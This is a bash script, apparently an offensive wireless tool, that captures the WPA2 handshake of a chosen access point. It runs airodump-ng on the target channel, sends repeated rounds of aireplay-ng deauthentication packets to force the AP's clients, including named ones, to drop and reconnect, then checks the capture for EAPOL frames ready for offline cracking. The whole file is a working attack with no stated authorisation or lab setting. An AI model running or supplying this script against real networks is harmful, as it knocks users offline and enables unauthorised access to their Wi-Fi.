#!/bin/bash
# grab_hs.sh - Capture WPA2 handshake for a target AP
# Usage: sudo bash /tmp/grab_hs.sh <BSSID> <CHANNEL> [CLIENT1] [CLIENT2]

BSSID="$1"
CH="$2"
CLIENT1="$3"
CLIENT2="$4"
PREFIX="/tmp/hs_grab"

if [ -z "$BSSID" ] || [ -z "$CH" ]; then
    echo "Usage: $0 <BSSID> <CHANNEL> [CLIENT1] [CLIENT2]"
    exit 1
fi

# Calculate freq
case "$CH" in
    1) FREQ=2412;; 2) FREQ=2417;; 3) FREQ=2422;; 4) FREQ=2427;;
    5) FREQ=2432;; 6) FREQ=2437;; 7) FREQ=2442;; 8) FREQ=2447;;
    9) FREQ=2452;; 10) FREQ=2457;; 11) FREQ=2462;; 12) FREQ=2467;;
    13) FREQ=2472;;
    36) FREQ=5180;; 40) FREQ=5200;; 44) FREQ=5220;; 48) FREQ=5240;;
    *) FREQ=$((2407 + CH * 5));;
esac

echo "[*] Target: $BSSID ch$CH ($FREQ MHz)"
[ -n "$CLIENT1" ] && echo "[*] Client1: $CLIENT1"
[ -n "$CLIENT2" ] && echo "[*] Client2: $CLIENT2"

# Set channel
iw dev wlan0 set freq $FREQ 2>/dev/null

# Clean old files
rm -f ${PREFIX}*

# Start capture
airodump-ng wlan0 --channel $CH --bssid "$BSSID" -w "$PREFIX" --output-format pcap,csv --ignore-negative-one 2>/dev/null &
CAP_PID=$!
sleep 3

# Deauth loop
for round in $(seq 1 8); do
    echo "[*] Deauth round $round/8"
    aireplay-ng --deauth 20 -a "$BSSID" --ignore-negative-one wlan0 2>/dev/null &
    if [ -n "$CLIENT1" ]; then
        aireplay-ng --deauth 10 -a "$BSSID" -c "$CLIENT1" --ignore-negative-one wlan0 2>/dev/null &
    fi
    if [ -n "$CLIENT2" ]; then
        aireplay-ng --deauth 10 -a "$BSSID" -c "$CLIENT2" --ignore-negative-one wlan0 2>/dev/null &
    fi
    wait
    sleep 4

    # Check if we got handshake already
    HS=$(aircrack-ng ${PREFIX}-01.cap 2>&1 | grep -c "1 handshake")
    if [ "$HS" -gt 0 ]; then
        echo "[!] HANDSHAKE CAPTURED after round $round!"
        break
    fi
done

# Final wait for late reconnections
echo "[*] Final capture window (20s)..."
sleep 20

kill $CAP_PID 2>/dev/null
wait $CAP_PID 2>/dev/null

echo ""
echo "=== Results ==="
ls -la ${PREFIX}-01.cap 2>/dev/null
echo ""
EAPOL=$(tcpdump -r ${PREFIX}-01.cap -n 2>/dev/null | grep -ci "eapol\|802.1X")
echo "[*] EAPOL frames: $EAPOL"
echo ""
aircrack-ng ${PREFIX}-01.cap 2>&1 | head -15
echo ""

if [ "$EAPOL" -gt 0 ]; then
    echo "[*] Capture saved to ${PREFIX}-01.cap"
else
    echo "[!] No EAPOL captured. Clients may not have reconnected."
fi
